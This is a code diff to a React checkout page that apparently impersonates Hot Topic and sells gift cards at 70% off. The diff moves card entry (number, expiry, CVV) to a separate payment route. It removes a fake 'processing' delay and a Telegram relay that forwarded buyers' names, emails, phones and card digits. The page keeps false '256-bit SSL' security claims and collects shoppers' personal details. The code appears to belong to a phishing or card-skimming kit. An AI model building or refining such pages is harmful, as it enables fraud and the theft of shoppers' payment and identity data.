@@ -1,4 +1,3 @@
-
 import { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
@@ -12,7 +11,7 @@ import HotTopicPromo from "@/components/HotTopicPromo";
 import HotTopicFooter from "@/components/HotTopicFooter";
 import TestimonialCarousel from "@/components/TestimonialCarousel";
 import { 
-  AlertCircle, Gift, CreditCard, LockIcon, ChevronRight, Shield, Star, Users 
+  AlertCircle, Gift, ChevronRight, Shield, Star, Users 
 } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { supabase } from "@/integrations/supabase/client";
@@ -29,14 +28,11 @@ const CARD_TYPES = [
 const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
 const PHONE_REGEX = /^(\+1|1)?[-. ]?\(?([0-9]{3})\)?[-. ]?([0-9]{3})[-. ]?([0-9]{4})$/;
 const ZIP_REGEX = /^\d{5}(-\d{4})?$/;
-const CARD_NUMBER_REGEX = /^[0-9]{13,19}$/;
-const CVV_REGEX = /^[0-9]{3,4}$/;
 
 const Index = () => {
   const navigate = useNavigate();
   const [selectedAmount, setSelectedAmount] = useState<number | null>(null);
   const [deliveryMethod, setDeliveryMethod] = useState<"e-gift" | "physical">("e-gift");
-  const [selectedCardType, setSelectedCardType] = useState<string>("Visa");
   const [formData, setFormData] = useState({
     firstName: "",
     lastName: "",
@@ -45,11 +41,7 @@ const Index = () => {
     address: "",
     city: "",
     state: "",
-    zipCode: "",
-    cardNumber: "",
-    cardName: "",
-    expiryDate: "",
-    cvv: ""
+    zipCode: ""
   });
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -58,7 +50,6 @@ const Index = () => {
     switch (name) {
       case "firstName":
       case "lastName":
-      case "cardName":
         return value.trim() === "" ? "This field is required" : "";
       case "email":
         return !EMAIL_REGEX.test(value) ? "Please enter a valid email address" : "";
@@ -70,23 +61,6 @@ const Index = () => {
         return deliveryMethod === "physical" && value.trim() === "" ? "This field is required" : "";
       case "zipCode":
         return deliveryMethod === "physical" && !ZIP_REGEX.test(value) ? "Please enter a valid ZIP code" : "";
-      case "cardNumber":
-        return !CARD_NUMBER_REGEX.test(value.replace(/\s/g, '')) ? "Please enter a valid card number" : "";
-      case "expiryDate":
-        const [month, year] = value.split('/').map(part => part.trim());
-        if (!month || !year || isNaN(Number(month)) || isNaN(Number(year))) {
-          return "Please enter a valid expiry date (MM/YY)";
-        }
-        if (Number(month) < 1 || Number(month) > 12) {
-          return "Month must be between 1 and 12";
-        }
-        const currentYear = new Date().getFullYear() % 100;
-        if (Number(year) < currentYear) {
-          return "Card has expired";
-        }
-        return "";
-      case "cvv":
-        return !CVV_REGEX.test(value) ? "Please enter a valid CVV" : "";
       default:
         return "";
     }
@@ -119,30 +93,6 @@ const Index = () => {
     return cleaned;
   };
 
-  const formatCardNumber = (value: string): string => {
-    // Remove all non-digit characters
-    const cleaned = value.replace(/\D/g, '');
-    
-    // Format as XXXX XXXX XXXX XXXX
-    const chunks = [];
-    for (let i = 0; i < cleaned.length; i += 4) {
-      chunks.push(cleaned.substring(i, i + 4));
-    }
-    return chunks.join(' ');
-  };
-
-  const formatExpiryDate = (value: string): string => {
-    // Remove all non-digit characters
-    const cleaned = value.replace(/\D/g, '');
-    
-    // Format as MM/YY
-    if (cleaned.length >= 3) {
-      return `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}`;
-    } else {
-      return cleaned;
-    }
-  };
-
   const handlePhoneInput = (e: React.ChangeEvent<HTMLInputElement>) => {
     const formatted = formatPhoneNumber(e.target.value);
     setFormData(prev => ({
@@ -155,36 +105,6 @@ const Index = () => {
     setErrors(prev => ({
       ...prev,
       phone: error
-    }));
-  };
-
-  const handleCardNumberInput = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatted = formatCardNumber(e.target.value);
-    setFormData(prev => ({
-      ...prev,
-      cardNumber: formatted
-    }));
-    
-    // Validate card number
-    const error = validateField("cardNumber", formatted);
-    setErrors(prev => ({
-      ...prev,
-      cardNumber: error
-    }));
-  };
-
-  const handleExpiryDateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatted = formatExpiryDate(e.target.value);
-    setFormData(prev => ({
-      ...prev,
-      expiryDate: formatted
-    }));
-    
-    // Validate expiry date
-    const error = validateField("expiryDate", formatted);
-    setErrors(prev => ({
-      ...prev,
-      expiryDate: error
     }));
   };
 
@@ -205,7 +125,7 @@ const Index = () => {
     let hasErrors = false;
     
     // Fields to validate
-    const fieldNames = ["firstName", "lastName", "email", "phone", "cardNumber", "cardName", "expiryDate", "cvv"];
+    const fieldNames = ["firstName", "lastName", "email", "phone"];
     if (deliveryMethod === "physical") {
       fieldNames.push("address", "city", "state", "zipCode");
     }
@@ -234,56 +154,39 @@ const Index = () => {
     setIsSubmitting(true);
     
     try {
-      console.log(`Processing payment for $${selectedAmount} gift card (70% off) using ${selectedCardType}`);
-      
       // Calculate the discounted amount (70% off)
       const discountedAmount = selectedAmount * 0.3;
       
-      // Create payment processing simulation
-      setTimeout(() => {
-        // Create order details object
-        const orderDetails = {
-          customerName: `${formData.firstName} ${formData.lastName}`,
-          email: formData.email,
-          phone: formData.phone,
+      // Create order details object
+      const orderDetails = {
+        customerName: `${formData.firstName} ${formData.lastName}`,
+        email: formData.email,
+        phone: formData.phone,
+        giftCardValue: selectedAmount,
+        paymentAmount: discountedAmount,
+        deliveryMethod: deliveryMethod,
+        orderDate: new Date().toISOString(),
+        address: deliveryMethod === "physical" ? {
+          street: formData.address,
+          city: formData.city,
+          state: formData.state,
+          zipCode: formData.zipCode
+        } : null
+      };
+
+      // Save order details to localStorage for reference
+      localStorage.setItem("hotTopicOrder", JSON.stringify(orderDetails));
+        
+      // Navigate to payment page with order details
+      navigate("/payment", { 
+        state: { 
+          orderDetails,
           giftCardValue: selectedAmount,
-          paymentAmount: discountedAmount,
-          deliveryMethod: deliveryMethod,
-          paymentMethod: selectedCardType,
-          orderDate: new Date().toISOString(),
-          lastFour: formData.cardNumber.slice(-4)
-        };
-  
-        // Save order details to localStorage for reference
-        localStorage.setItem("hotTopicOrder", JSON.stringify(orderDetails));
-        
-        // Send order notification to Telegram
-        try {
-          console.log("Sending order notification to Telegram with details:", orderDetails);
-          supabase.functions.invoke("send-telegram-notification", {
-            body: orderDetails
-          }).then(response => {
-            if (response.error) {
-              console.error("Failed to send Telegram notification:", response.error);
-            } else {
-              console.log("Telegram notification sent successfully:", response.data);
-            }
-          });
-        } catch (telegramErr) {
-          console.error("Error sending Telegram notification:", telegramErr);
-        }
-        
-        // Navigate to payment success page
-        navigate("/payment-success", { 
-          state: { 
-            orderDetails,
-            giftCardValue: selectedAmount,
-            discountedAmount
-          } 
-        });
-      }, 2500);
+          discountedAmount
+        } 
+      });
     } catch (error) {
-      console.error("Payment submission error:", error);
+      console.error("Order submission error:", error);
       toast({
         title: "System Error",
         description: "We encountered a technical issue. Please try again later.",
@@ -506,121 +409,6 @@ const Index = () => {
             </div>
           </div>
           
-          {/* Step 4: Payment Information */}
-          <div className="space-y-4 bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
-            <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
-              <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
-                4
-              </span>
-              Payment Information
-            </h2>
-            
-            <div className="space-y-4">
-              <div className="space-y-2">
-                <Label htmlFor="cardType" className="text-white">Card Type*</Label>
-                <div className="flex items-center gap-2">
-                  <CreditCard className="h-5 w-5 text-hottopic-red" />
-                  <Select
-                    value={selectedCardType}
-                    onValueChange={(value) => setSelectedCardType(value)}
-                  >
-                    <SelectTrigger 
-                      className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red w-full sm:w-auto"
-                      id="cardType"
-                    >
-                      <SelectValue placeholder="Select card type" />
-                    </SelectTrigger>
-                    <SelectContent className="bg-hottopic-dark border-hottopic-gray">
-                      {CARD_TYPES.map((card) => (
-                        <SelectItem 
-                          key={card.name} 
-                          value={card.name}
-                          className="text-white hover:bg-hottopic-gray/30 focus:bg-hottopic-gray/30"
-                        >
-                          <div className="flex items-center gap-2">
-                            <img src={card.image} alt={card.name} className="w-8 h-auto" /> 
-                            {card.name}
-                          </div>
-                        </SelectItem>
-                      ))}
-                    </SelectContent>
-                  </Select>
-                </div>
-              </div>
-              
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div className="space-y-2">
-                  <Label htmlFor="cardNumber" className="text-white">Card Number*</Label>
-                  <div className="relative">
-                    <Input
-                      id="cardNumber"
-                      name="cardNumber"
-                      value={formData.cardNumber}
-                      onChange={handleCardNumberInput}
-                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red pl-9 font-mono ${errors.cardNumber ? 'border-red-500' : ''}`}
-                      placeholder="•••• •••• •••• ••••"
-                      maxLength={19}
-                    />
-                    <CreditCard className="absolute left-3 top-2.5 h-4 w-4 text-gray-400" />
-                  </div>
-                  {renderErrorMessage("cardNumber")}
-                </div>
-                <div className="space-y-2">
-                  <Label htmlFor="cardName" className="text-white">Name on Card*</Label>
-                  <Input
-                    id="cardName"
-                    name="cardName"
-                    value={formData.cardName}
-                    onChange={handleInputChange}
-                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cardName ? 'border-red-500' : ''}`}
-                    placeholder="Enter name as it appears on card"
-                  />
-                  {renderErrorMessage("cardName")}
-                </div>
-              </div>
-              
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div className="space-y-2">
-                  <Label htmlFor="expiryDate" className="text-white">Expiry Date*</Label>
-                  <Input
-                    id="expiryDate"
-                    name="expiryDate"
-                    value={formData.expiryDate}
-                    onChange={handleExpiryDateInput}
-                    className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.expiryDate ? 'border-red-500' : ''}`}
-                    placeholder="MM/YY"
-                    maxLength={5}
-                  />
-                  {renderErrorMessage("expiryDate")}
-                </div>
-                <div className="space-y-2">
-                  <Label htmlFor="cvv" className="text-white">Security Code (CVV)*</Label>
-                  <div className="relative">
-                    <Input
-                      id="cvv"
-                      name="cvv"
-                      value={formData.cvv}
-                      onChange={handleInputChange}
-                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cvv ? 'border-red-500' : ''}`}
-                      placeholder="•••"
-                      maxLength={4}
-                      type="password"
-                    />
-                    <div className="absolute right-3 top-2.5 h-4 w-4 text-gray-400">
-                      <LockIcon size={16} />
-                    </div>
-                  </div>
-                  {renderErrorMessage("cvv")}
-                </div>
-              </div>
-
-              <div className="flex items-center mt-2 text-sm text-gray-400">
-                <Shield size={14} className="mr-1" />
-                Your payment information is secure and encrypted
-              </div>
-            </div>
-          </div>
-          
           {/* Order Summary */}
           {selectedAmount && (
             <div className="bg-hottopic-gray/10 border border-hottopic-gray/20 rounded-xl p-6">
@@ -642,12 +430,6 @@ const Index = () => {
                   <span className="text-gray-400">Delivery Method</span>
                   <span className="text-white capitalize">{deliveryMethod}</span>
                 </div>
-                <div className="flex justify-between">
-                  <span className="text-gray-400">Payment Method</span>
-                  <span className="text-white">
-                    {selectedCardType}
-                  </span>
-                </div>
                 <div className="border-t border-hottopic-gray/30 my-2 pt-2 flex justify-between font-bold">
                   <span className="text-white">Total</span>
                   <span className="text-hottopic-red text-xl">${(selectedAmount * 0.3).toFixed(2)}</span>
@@ -663,12 +445,12 @@ const Index = () => {
               disabled={isSubmitting || !selectedAmount}
               className="w-full md:w-auto px-8 py-6 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
             >
-              {isSubmitting ? "Processing..." : "Complete Purchase"}
+              {isSubmitting ? "Processing..." : "Continue to Payment"}
             </Button>
           </div>
           
           <div className="flex items-center justify-center text-center">
-            <LockIcon size={16} className="text-gray-400 mr-2" />
+            <Shield size={16} className="text-gray-400 mr-2" />
             <p className="text-gray-400 text-sm">
               Secure checkout - Your information is protected with 256-bit SSL encryption
             </p>
@@ -719,7 +501,7 @@ const Index = () => {
   );
 };
 
-// Updated FaqItem component with new font classes
+// FaqItem component
 const FaqItem = ({ question, answer }: { question: string; answer: string }) => {
   const [isOpen, setIsOpen] = useState(false);
   
